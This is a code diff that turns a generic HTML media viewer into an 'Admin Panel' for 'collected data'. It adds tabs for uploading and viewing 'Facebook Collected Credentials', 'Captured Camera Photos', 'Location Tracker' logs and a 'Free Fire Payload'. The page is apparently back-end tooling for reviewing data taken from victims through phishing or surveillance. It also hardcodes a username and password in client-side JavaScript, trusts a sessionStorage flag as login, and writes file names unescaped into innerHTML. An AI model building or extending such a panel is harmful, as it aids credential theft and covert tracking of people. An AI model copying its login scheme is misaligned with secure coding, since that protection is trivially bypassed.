@@ -3,80 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Multi-Category Data & Media Viewer</title>
+    <title>Secure Admin Panel - Collected Data Viewer</title>
     <style>
         :root {
-            --primary-color: #4f46e5;
-            --primary-hover: #4338ca;
-            --bg-color: #f3f4f6;
-            --card-bg: #ffffff;
-            --text-color: #1f2937;
-            --border-color: #e5e7eb;
-            --accent-camera: #2563eb;
-            --accent-ff: #d97706;
-            --accent-insta: #db2777;
-            --accent-location: #059669;
+            --bg-gradient: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.15);
+            --glass-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            --pink-accent: #ff2a85;
+            --purple-accent: #9d4edd;
+            --text-color: #f8f9fa;
         }
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
+            background: var(--bg-gradient);
             color: var(--text-color);
             margin: 0;
             padding: 20px;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
             min-height: 100vh;
+            background-attachment: fixed;
         }
 
-        .container {
+        /* Glassmorphism Card Style */
+        .glass-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid var(--glass-border);
+            border-radius: 16px;
+            box-shadow: var(--glass-shadow);
+        }
+
+        /* Login Screen Container */
+        #loginContainer {
             width: 100%;
-            max-width: 1000px;
-            background: var(--card-bg);
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            max-width: 400px;
+            padding: 40px;
+            text-align: center;
         }
 
         h2 {
             margin-top: 0;
-            color: var(--primary-color);
-            text-align: center;
+            color: #fff;
+            font-size: 1.8rem;
+            margin-bottom: 25px;
+            text-shadow: 0 2px 10px rgba(255, 42, 133, 0.5);
+        }
+
+        .input-group {
             margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #e0aaff;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--pink-accent);
+            box-shadow: 0 0 10px rgba(255, 42, 133, 0.4);
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--pink-accent), var(--purple-accent));
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: opacity 0.2s, transform 0.2s;
+            box-shadow: 0 4px 15px rgba(157, 78, 221, 0.4);
+        }
+
+        .btn:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+
+        .error-msg {
+            color: #ff6b6b;
+            font-size: 0.85rem;
+            margin-top: 15px;
+        }
+
+        /* Admin Dashboard Container */
+        #dashboardContainer {
+            display: none;
+            width: 100%;
+            max-width: 1100px;
+            padding: 30px;
+            box-sizing: border-box;
+        }
+
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--glass-border);
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+        }
+
+        .dashboard-header h2 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .btn-logout {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--glass-border);
+            padding: 8px 15px;
+            width: auto;
+            font-size: 0.85rem;
         }
 
         /* Category Tabs */
         .tabs {
             display: flex;
             gap: 10px;
-            margin-bottom: 20px;
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 10px;
+            margin-bottom: 25px;
             overflow-x: auto;
+            padding-bottom: 5px;
         }
 
         .tab-btn {
-            background-color: #e5e7eb;
-            border: none;
-            padding: 10px 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--glass-border);
+            padding: 10px 18px;
             font-size: 0.9rem;
             font-weight: 600;
-            border-radius: 6px;
+            border-radius: 8px;
             cursor: pointer;
-            transition: all 0.2s;
+            color: #d8b4fe;
+            transition: all 0.3s;
             white-space: nowrap;
-            color: #4b5563;
         }
 
         .tab-btn.active {
+            background: linear-gradient(135deg, var(--pink-accent), var(--purple-accent));
             color: white;
+            border-color: transparent;
+            box-shadow: 0 0 15px rgba(255, 42, 133, 0.5);
         }
-
-        .tab-btn[data-target="camera"].active { background-color: var(--accent-camera); }
-        .tab-btn[data-target="ff"].active { background-color: var(--accent-ff); }
-        .tab-btn[data-target="insta"].active { background-color: var(--accent-insta); }
-        .tab-btn[data-target="location"].active { background-color: var(--accent-location); }
 
         .tab-content {
             display: none;
@@ -86,83 +178,52 @@
             display: block;
         }
 
+        /* Control / Uploader layout */
         .controls {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            background: #f9fafb;
+            background: rgba(0, 0, 0, 0.15);
             padding: 15px;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            border: 1px solid var(--glass-border);
             margin-bottom: 20px;
         }
 
         .file-input-wrapper {
             display: flex;
             flex-direction: column;
-            gap: 5px;
+            gap: 8px;
         }
 
         label {
             font-size: 0.85rem;
             font-weight: 600;
-            color: #4b5563;
+            color: #e0aaff;
         }
 
         input[type="file"] {
-            font-size: 0.9rem;
+            color: #fff;
         }
 
-        .btn {
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            padding: 10px 18px;
-            font-size: 0.9rem;
-            font-weight: 600;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-            text-decoration: none;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .btn:hover {
-            background-color: var(--primary-hover);
-        }
-
-        .btn-download {
-            background-color: #10b981;
-        }
-
-        .btn-download:hover {
-            background-color: #059669;
-        }
-
+        /* Viewer Display Area */
         .viewer-screen {
             width: 100%;
             height: 450px;
-            border: 2px dashed var(--border-color);
-            border-radius: 8px;
+            border: 2px dashed var(--glass-border);
+            border-radius: 10px;
             display: flex;
             justify-content: center;
             align-items: center;
             overflow: hidden;
-            background-color: #fafafa;
+            background: rgba(0, 0, 0, 0.2);
             position: relative;
         }
 
         .placeholder-text {
-            color: #9ca3af;
-            font-size: 1rem;
+            color: #b8c1ec;
+            font-size: 0.95rem;
             text-align: center;
             padding: 20px;
         }
 
-        /* Screen Elements */
         .viewer-screen img, 
         .viewer-screen video, 
         .viewer-screen iframe {
@@ -180,15 +241,11 @@
             margin: 0;
             padding: 15px;
             overflow: auto;
-            background: #1e1e1e;
-            color: #d4d4d4;
+            background: #121019;
+            color: #ff758c;
             font-family: 'Courier New', Courier, monospace;
             font-size: 0.9rem;
             text-align: left;
-        }
-
-        .hidden {
-            display: none !important;
         }
 
         .action-bar {
@@ -196,26 +253,72 @@
             justify-content: flex-end;
             margin-top: 15px;
         }
+
+        .btn-download {
+            background: linear-gradient(135deg, #10b981, #059669);
+            width: auto;
+            padding: 10px 20px;
+            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
+        }
+
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>Multi-Category Data & Media Viewer</h2>
+    <!-- 1. ADMIN LOGIN PANEL -->
+    <div id="loginContainer" class="glass-card">
+        <h2>🔒 Admin Login</h2>
+        <div class="input-group">
+            <label for="usernameInput">Username</label>
+            <input type="text" id="usernameInput" placeholder="Enter username">
+        </div>
+        <div class="input-group">
+            <label for="passwordInput">Password</label>
+            <input type="password" id="passwordInput" placeholder="Enter password">
+        </div>
+        <button class="btn" onclick="handleLogin()">Login Dashboard</button>
+        <div id="errorMsg" class="error-msg"></div>
+    </div>
+
+    <!-- 2. COLLECTED DATA VIEWER DASHBOARD (Protected) -->
+    <div id="dashboardContainer" class="glass-card">
+        <div class="dashboard-header">
+            <h2>✨ Collected Data Admin Panel</h2>
+            <button class="btn btn-logout" onclick="handleLogout()">Logout</button>
+        </div>
         
         <!-- Category Navigation Tabs -->
         <div class="tabs">
-            <button class="tab-btn active" data-target="camera" onclick="switchTab('camera')">📷 Camera Photos & Media</button>
-            <button class="tab-btn" data-target="ff" onclick="switchTab('ff')">🎮 Free Fire Data</button>
-            <button class="tab-btn" data-target="insta" onclick="switchTab('insta')">📸 Instagram Data</button>
-            <button class="tab-btn" data-target="location" onclick="switchTab('location')">📍 Location Data</button>
+            <button class="tab-btn active" data-target="facebook" onclick="switchTab('facebook')">📘 Facebook Data / Logins</button>
+            <button class="tab-btn" data-target="camera" onclick="switchTab('camera')">📷 Camera Photos & Media</button>
+            <button class="tab-btn" data-target="location" onclick="switchTab('location')">📍 Location Data Logs</button>
+            <button class="tab-btn" data-target="ff" onclick="switchTab('ff')">🎮 Free Fire Data Logs</button>
         </div>
 
-        <!-- 1. CAMERA PHOTOS & MEDIA TAB -->
-        <div id="camera-section" class="tab-content active">
+        <!-- 1. FACEBOOK DATA TAB -->
+        <div id="facebook-section" class="tab-content active">
             <div class="controls">
                 <div class="file-input-wrapper">
-                    <label for="cameraUpload">Select Camera Photos / Videos:</label>
+                    <label for="facebookUpload">Upload Facebook Collected Credentials / JSON / Logs:</label>
+                    <input type="file" id="facebookUpload" accept=".json,.txt,.csv" onchange="handleFile('facebook', event)">
+                </div>
+            </div>
+            <div class="viewer-screen" id="facebookViewer">
+                <div class="placeholder-text">No Facebook data file uploaded. Inspect captured info here.</div>
+            </div>
+            <div class="action-bar">
+                <a id="facebookDownload" href="#" class="btn btn-download hidden" download>📥 Download Facebook Data</a>
+            </div>
+        </div>
+
+        <!-- 2. CAMERA MEDIA TAB -->
+        <div id="camera-section" class="tab-content">
+            <div class="controls">
+                <div class="file-input-wrapper">
+                    <label for="cameraUpload">Upload Captured Camera Photos / Videos:</label>
                     <input type="file" id="cameraUpload" accept="image/*,video/*" onchange="handleFile('camera', event)">
                 </div>
             </div>
@@ -223,74 +326,93 @@
                 <div class="placeholder-text">No camera media uploaded yet.</div>
             </div>
             <div class="action-bar">
-                <a id="cameraDownload" href="#" class="btn btn-download hidden" download>📥 Download File</a>
+                <a id="cameraDownload" href="#" class="btn btn-download hidden" download>📥 Download Media File</a>
             </div>
         </div>
 
-        <!-- 2. FREE FIRE DATA TAB -->
+        <!-- 3. LOCATION DATA TAB -->
+        <div id="location-section" class="tab-content">
+            <div class="controls">
+                <div class="file-input-wrapper">
+                    <label for="locationUpload">Upload Location Tracker Log (JSON / CSV / TXT):</label>
+                    <input type="file" id="locationUpload" accept=".json,.csv,.txt,.kml" onchange="handleFile('location', event)">
+                </div>
+            </div>
+            <div class="viewer-screen" id="locationViewer">
+                <div class="placeholder-text">No location log loaded.</div>
+            </div>
+            <div class="action-bar">
+                <a id="locationDownload" href="#" class="btn btn-download hidden" download>📥 Download Location Log</a>
+            </div>
+        </div>
+
+        <!-- 4. FREE FIRE DATA TAB -->
         <div id="ff-section" class="tab-content">
             <div class="controls">
                 <div class="file-input-wrapper">
-                    <label for="ffUpload">Upload Free Fire Config / JSON / Data File:</label>
-                    <input type="file" id="ffUpload" accept=".json,.txt,.xml,.dat" onchange="handleFile('ff', event)">
+                    <label for="ffUpload">Upload Free Fire Payload / Config / JSON Data:</label>
+                    <input type="file" id="ffUpload" accept=".json,.txt,.dat" onchange="handleFile('ff', event)">
                 </div>
             </div>
             <div class="viewer-screen" id="ffViewer">
-                <div class="placeholder-text">No Free Fire data file loaded.</div>
+                <div class="placeholder-text">No Free Fire configuration data loaded.</div>
             </div>
             <div class="action-bar">
                 <a id="ffDownload" href="#" class="btn btn-download hidden" download>📥 Download FF File</a>
             </div>
         </div>
-
-        <!-- 3. INSTAGRAM DATA TAB -->
-        <div id="insta-section" class="tab-content">
-            <div class="controls">
-                <div class="file-input-wrapper">
-                    <label for="instaUpload">Upload Instagram Export / JSON / Media:</label>
-                    <input type="file" id="instaUpload" accept=".json,.html,.txt,image/*" onchange="handleFile('insta', event)">
-                </div>
-            </div>
-            <div class="viewer-screen" id="instaViewer">
-                <div class="placeholder-text">No Instagram data file loaded.</div>
-            </div>
-            <div class="action-bar">
-                <a id="instaDownload" href="#" class="btn btn-download hidden" download>📥 Download Insta File</a>
-            </div>
-        </div>
-
-        <!-- 4. LOCATION DATA TAB -->
-        <div id="location-section" class="tab-content">
-            <div class="controls">
-                <div class="file-input-wrapper">
-                    <label for="locationUpload">Upload Location File (JSON / KML / CSV / Text):</label>
-                    <input type="file" id="locationUpload" accept=".json,.kml,.csv,.txt" onchange="handleFile('location', event)">
-                </div>
-            </div>
-            <div class="viewer-screen" id="locationViewer">
-                <div class="placeholder-text">No Location data loaded.</div>
-            </div>
-            <div class="action-bar">
-                <a id="locationDownload" href="#" class="btn btn-download hidden" download>📥 Download Location File</a>
-            </div>
-        </div>
     </div>
 
     <script>
-        // Keep track of active object URLs for cleanup
+        const correctUser = "sumit@1123";
+        const correctPass = "sumit1123";
+
+        // Check if already logged in via Session Storage
+        window.onload = function() {
+            if (sessionStorage.getItem("isAdminLoggedIn") === "true") {
+                showDashboard();
+            }
+        };
+
+        function handleLogin() {
+            const user = document.getElementById("usernameInput").value.trim();
+            const pass = document.getElementById("passwordInput").value.trim();
+            const errorMsg = document.getElementById("errorMsg");
+
+            if (user === correctUser && pass === correctPass) {
+                sessionStorage.setItem("isAdminLoggedIn", "true");
+                showDashboard();
+            } else {
+                errorMsg.textContent = "Invalid Username or Password! Try again.";
+            }
+        }
+
+        function showDashboard() {
+            document.getElementById("loginContainer").classList.add("hidden");
+            document.getElementById("dashboardContainer").style.display = "block";
+        }
+
+        function handleLogout() {
+            sessionStorage.removeItem("isAdminLoggedIn");
+            document.getElementById("dashboardContainer").style.display = "none";
+            document.getElementById("loginContainer").classList.remove("hidden");
+            document.getElementById("usernameInput").value = "";
+            document.getElementById("passwordInput").value = "";
+            document.getElementById("errorMsg").textContent = "";
+        }
+
+        // Active Object URLs tracker for memory cleanup
         const activeURLs = {
+            facebook: null,
             camera: null,
-            ff: null,
-            insta: null,
-            location: null
+            location: null,
+            ff: null
         };
 
         function switchTab(category) {
-            // Remove active states from tabs
             document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
             document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
 
-            // Add active states to target
             document.querySelector(`[data-target="${category}"]`).classList.add('active');
             document.getElementById(`${category}-section`).classList.add('active');
         }
@@ -302,25 +424,21 @@
 
             if (!file) return;
 
-            // Revoke old URL if present
             if (activeURLs[category]) {
                 URL.revokeObjectURL(activeURLs[category]);
             }
 
             activeURLs[category] = URL.createObjectURL(file);
 
-            // Setup specific download button
             downloadBtn.href = activeURLs[category];
             downloadBtn.download = file.name;
             downloadBtn.classList.remove('hidden');
 
-            // Clear viewer screen
             viewer.innerHTML = '';
 
             const fileType = file.type;
             const fileName = file.name.toLowerCase();
 
-            // Render based on file category and format
             if (category === 'camera') {
                 if (fileType.startsWith('image/')) {
                     const img = document.createElement('img');
@@ -334,15 +452,9 @@
                 } else {
                     showUnsupported(viewer, file.name);
                 }
-            } 
-            else if (category === 'insta' && fileType.startsWith('image/')) {
-                const img = document.createElement('img');
-                img.src = activeURLs[category];
-                viewer.appendChild(img);
-            }
-            else {
-                // For Text/JSON/Config data formats (FF, Insta, Location)
-                if (fileType.includes('json') || fileType.includes('text') || fileName.endsWith('.json') || fileName.endsWith('.txt') || fileName.endsWith('.csv') || fileName.endsWith('.kml') || fileName.endsWith('.html')) {
+            } else {
+                // Text, JSON, logs, or general payload records
+                if (fileType.includes('json') || fileType.includes('text') || fileName.endsWith('.json') || fileName.endsWith('.txt') || fileName.endsWith('.csv') || fileName.endsWith('.kml')) {
                     const reader = new FileReader();
                     reader.onload = function(e) {
                         const pre = document.createElement('pre');
@@ -363,7 +475,7 @@
         function showUnsupported(viewer, name) {
             const div = document.createElement('div');
             div.className = 'placeholder-text';
-            div.innerHTML = `Preview not directly supported for <strong>${name}</strong>.<br>Use the download button below to access the file.`;
+            div.innerHTML = `File preview not supported for <strong>${name}</strong>.<br>Use the download button below to access it.`;
             viewer.appendChild(div);
         }
     </script>
